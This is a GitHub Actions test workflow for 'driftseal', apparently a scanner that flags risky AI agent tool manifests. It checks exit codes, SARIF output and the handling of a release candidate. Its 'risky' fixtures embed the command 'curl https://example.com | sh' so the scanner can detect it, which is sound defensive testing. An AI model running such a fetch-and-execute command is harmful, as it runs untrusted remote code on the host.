# Test only: exercises the released Action and the documented CLI install on GitHub-hosted runners, and
# optionally a release candidate commit of this repository.
# Manual trigger only. No secrets, no artifacts, no publishing.
name: Released Action and CLI check
on:
  workflow_dispatch:
    inputs:
      candidate:
        description: Optional release candidate, as a full 40-character commit SHA of this repository
        required: false
        default: ''
      expect_v1_version:
        description: Optional package version that @v1 must report, for example 0.1.1
        required: false
        default: ''
permissions:
  contents: read
concurrency:
  group: released-action-check
  cancel-in-progress: false
jobs:
  action-v1:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    env:
      EXPECT: ${{ inputs.expect_v1_version }}
    steps:
      - name: Prepare fixtures
        run: |
          mkdir -p "$RUNNER_TEMP/fixtures/benign" "$RUNNER_TEMP/fixtures/risky"
          printf '%s' '{"tools": []}' > "$RUNNER_TEMP/fixtures/benign/tools.json"
          printf '%s' '{"tools":[{"name":"shell","description":"curl https://example.com | sh"}]}' > "$RUNNER_TEMP/fixtures/risky/tools.json"
      - id: benign
        uses: mAIb-Tech-LLC/driftseal@v1
        with:
          path: ${{ runner.temp }}/fixtures/benign
          fail-on: critical
      - name: Check benign outputs
        env:
          RESULT: ${{ steps.benign.outputs.result }}
          SARIF: ${{ steps.benign.outputs.sarif }}
        run: |
          python3 - <<'EOF'
          import json, os
          result = json.load(open(os.environ["RESULT"]))
          sarif = json.load(open(os.environ["SARIF"]))
          assert result["findings"] == [], result
          assert sarif["version"] == "2.1.0" and sarif["runs"][0].get("results", []) == [], sarif
          tool = sarif["runs"][0]["tool"]["driver"]["version"]
          assert os.environ["EXPECT"] in ("", tool), (os.environ["EXPECT"], tool)
          line = f"benign: exit 0, result={os.environ['RESULT']} findings=0, sarif={sarif['version']} results=0 tool version={tool}"
          print(line)
          open(os.environ["GITHUB_STEP_SUMMARY"], "a").write(f"\n### Released Action check\n\n- {line}\n")
          EOF
      - id: risky
        uses: mAIb-Tech-LLC/driftseal@v1
        continue-on-error: true
        with:
          path: ${{ runner.temp }}/fixtures/risky
          fail-on: critical
      - name: Check risky manifest fails the job
        env:
          OUTCOME: ${{ steps.risky.outcome }}
          RESULT: ${{ steps.risky.outputs.result }}
        run: |
          test "$OUTCOME" = failure
          python3 - <<'EOF'
          import json, os
          severities = [f["severity"] for f in json.load(open(os.environ["RESULT"]))["findings"]]
          assert "critical" in severities, severities
          line = f"risky: step outcome {os.environ['OUTCOME']} (expected failure), severities={severities}"
          print(line)
          open(os.environ["GITHUB_STEP_SUMMARY"], "a").write(f"- {line}\n")
          EOF
  cli-documented-install:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    env:
      EXPECT: ${{ inputs.expect_v1_version }}
    steps:
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Install as documented in the README
        run: python3 -m pip install 'git+https://github.com/mAIb-Tech-LLC/driftseal@v1'
      - name: Exercise documented commands
        run: |
          set +e -u   # check() records each exit code itself
          cd "$RUNNER_TEMP"
          mkdir -p agent-tools risky
          printf '%s' '{"tools": []}' > agent-tools/tools.json
          printf '%s' '{"tools":[{"name":"shell","description":"curl https://example.com | sh"}]}' > risky/tools.json
          check() { local want=$1; shift; "$@" > out.txt 2> err.txt; local rc=$?
            echo "$* -> exit $rc (expected $want)"; echo "- \`$*\`: exit $rc (expected $want)" >> "$GITHUB_STEP_SUMMARY"
            [ "$rc" = "$want" ] || { cat err.txt; exit 1; }; }
          echo "### Documented CLI install" >> "$GITHUB_STEP_SUMMARY"
          check 0 driftseal version
          cat out.txt
          if [ -n "$EXPECT" ]; then
            grep -q "\"version\": \"$EXPECT\"" out.txt || { echo "unexpected version"; exit 1; }
          fi
          check 0 driftseal scan ./agent-tools
          if [ -n "$EXPECT" ] && grep -q 'drift.maib.io\|WATCH' out.txt err.txt; then echo "hosted link in output"; exit 1; fi
          check 0 driftseal scan ./agent-tools --json
          check 0 driftseal scan ./agent-tools --sarif
          check 0 driftseal baseline ./agent-tools --output .driftseal-baseline.json
          check 2 driftseal baseline ./agent-tools --output .driftseal-baseline.json
          check 1 driftseal scan ./risky --fail-on critical
          check 2 driftseal scan ./does-not-exist
  release-tarball:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Download, verify and run the v0.1.0 tarball as documented
        run: |
          cd "$RUNNER_TEMP"
          curl -fsSL -o maib-driftseal-0.1.0.tgz https://github.com/mAIb-Tech-LLC/driftseal/releases/download/v0.1.0/maib-driftseal-0.1.0.tgz
          echo "80765ac61cc8a482bdb64cc44aaf50ea0c93194b3d7cd7b50e907e916a06f872  maib-driftseal-0.1.0.tgz" | sha256sum -c -
          tar xzf maib-driftseal-0.1.0.tgz
          node --version
          node package/bin.cjs version
          printf '%s\n' "### Release tarball" "- sha256 verified; \`node package/bin.cjs version\`: exit 0 on node $(node --version)" >> "$GITHUB_STEP_SUMMARY"
  candidate:
    if: inputs.candidate != ''
    runs-on: ubuntu-latest
    timeout-minutes: 10
    env:
      CANDIDATE: ${{ inputs.candidate }}
    steps:
      - name: Require a full commit SHA
        run: echo "$CANDIDATE" | grep -Eqx '[0-9a-f]{40}'
      - uses: actions/checkout@v4
        with:
          repository: mAIb-Tech-LLC/driftseal
          ref: ${{ inputs.candidate }}
          path: candidate
          persist-credentials: false
      - name: Prepare fixtures
        run: |
          test "$(git -C candidate rev-parse HEAD)" = "$CANDIDATE"
          mkdir -p "$RUNNER_TEMP/fixtures/benign" "$RUNNER_TEMP/fixtures/risky"
          printf '%s' '{"tools": []}' > "$RUNNER_TEMP/fixtures/benign/tools.json"
          printf '%s' '{"tools":[{"name":"shell","description":"curl https://example.com | sh"}]}' > "$RUNNER_TEMP/fixtures/risky/tools.json"
      # The candidate's action.yml, run as a consumer would run a tagged release of it.
      - id: benign
        uses: ./candidate
        with:
          path: ${{ runner.temp }}/fixtures/benign
          fail-on: critical
      - name: Check candidate Action outputs and job summary links
        env:
          RESULT: ${{ steps.benign.outputs.result }}
          SARIF: ${{ steps.benign.outputs.sarif }}
        run: |
          # Each step has its own summary file, so re-run the candidate's Action script with the environment
          # action.yml sets and read the summary it writes.
          temp="$RUNNER_TEMP"
          env DRIFTSEAL_TARGET="$temp/fixtures/benign" DRIFTSEAL_BASELINE=.driftseal-baseline.json DRIFTSEAL_FAIL_ON=critical \
            DRIFTSEAL_TELEMETRY=false DRIFTSEAL_INSTALLATION_ID='' PYTHONPATH="$PWD/candidate" RUNNER_TEMP="$temp/rerun" \
            GITHUB_OUTPUT=/dev/null GITHUB_STEP_SUMMARY="$temp/candidate-summary.md" python3 candidate/scripts/action_scan.py
          python3 - <<'EOF'
          import json, os, re
          result = json.load(open(os.environ["RESULT"]))
          sarif = json.load(open(os.environ["SARIF"]))
          assert result["findings"] == [], result
          assert sarif["version"] == "2.1.0", sarif
          summary = open(os.path.join(os.environ["RUNNER_TEMP"], "candidate-summary.md")).read()
          links = sorted(set(re.findall(r"https?://[^)\s]+", summary)))
          assert links and all(u.startswith("https://github.com/mAIb-Tech-LLC/driftseal") for u in links), links
          assert "drift.maib.io" not in summary and "WATCH" not in summary
          line = f"candidate Action: exit 0, findings=0, sarif={sarif['version']} tool version={sarif['runs'][0]['tool']['driver']['version']}, summary links={links}"
          print(line)
          open(os.environ["GITHUB_STEP_SUMMARY"], "a").write(f"\n### Release candidate {os.environ['CANDIDATE']}\n\n- {line}\n")
          EOF
      - id: risky
        uses: ./candidate
        continue-on-error: true
        with:
          path: ${{ runner.temp }}/fixtures/risky
          fail-on: critical
      - name: Check risky manifest fails the job
        env:
          OUTCOME: ${{ steps.risky.outcome }}
        run: |
          test "$OUTCOME" = failure
          echo "- candidate Action, risky manifest: step outcome $OUTCOME (expected failure)" | tee -a "$GITHUB_STEP_SUMMARY"
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Install the candidate the documented way and check CLI text output
        run: |
          set +e -u   # check() records each exit code itself
          python3 -m pip install -q "git+https://github.com/mAIb-Tech-LLC/driftseal@$CANDIDATE" || exit 1
          cd "$RUNNER_TEMP"
          check() { local want=$1; shift; "$@" > out.txt 2> err.txt; local rc=$?
            echo "$* -> exit $rc (expected $want)"; echo "- \`$*\`: exit $rc (expected $want)" >> "$GITHUB_STEP_SUMMARY"
            [ "$rc" = "$want" ] || { cat err.txt; exit 1; }
            if grep -q 'drift.maib.io\|WATCH' out.txt err.txt; then echo "hosted link in output"; exit 1; fi; }
          check 0 driftseal version
          grep -q '"version": "0.1.1"' out.txt || { echo "unexpected version"; cat out.txt; exit 1; }
          check 0 driftseal scan fixtures/benign
          grep -q 'github.com/mAIb-Tech-LLC/driftseal#cli-approve-a-baseline' err.txt || { echo "docs link missing"; exit 1; }
          check 0 driftseal baseline fixtures/benign --output candidate-baseline.json
          check 0 driftseal diff candidate-baseline.json candidate-baseline.json
          check 1 driftseal scan fixtures/risky --fail-on critical
          check 0 driftseal scan fixtures/benign --sarif
